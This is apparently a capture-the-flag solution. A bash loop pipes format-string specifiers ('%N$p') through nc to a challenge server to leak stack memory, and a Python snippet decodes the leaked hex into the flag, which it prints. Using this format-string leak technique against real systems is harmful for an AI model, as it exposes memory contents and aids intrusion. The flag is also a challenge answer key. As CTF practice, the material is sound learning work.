```bash
for i in {1..50}; do echo "%$i\$p" | nc shell.actf.co 21820 | grep Welcome; done
```

```python
from binascii import unhexlify
data = ['6c65777b66746361', '61625f6d27695f6c', '6c625f6e695f6b63', '5f7365795f6b6361', '6b6361625f6d2769', '5f6568745f6e695f', '65625f6b63617473', '3439323135623963', '3438363737646165', 'a7d333935663161']

print(''.join(unhexlify(x.rjust(16, '0'))[::-1].decode() for x in data))

# actf{well_i'm_back_in_black_yes_i'm_back_in_the_stack_bec9b51294ead77684a1f593}
```